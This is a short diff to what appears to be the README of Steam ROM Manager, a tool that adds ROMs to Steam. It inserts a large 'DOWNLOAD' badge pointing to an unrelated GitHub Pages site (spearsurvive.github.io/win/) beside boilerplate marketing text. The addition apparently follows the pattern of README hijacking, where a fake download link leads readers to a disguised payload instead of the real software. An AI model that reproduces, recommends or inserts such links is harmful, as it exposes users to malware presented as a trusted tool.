@@ -30,6 +30,12 @@ Steam ROM Manager scans your ROM folders and adds games to Steam with cover art,
 
 Whether you're a newcomer or a veteran, Steam ROM Manager provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download Steam ROM Manager](https://img.shields.io/badge/⬇_DOWNLOAD_Steam+ROM+Manager-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
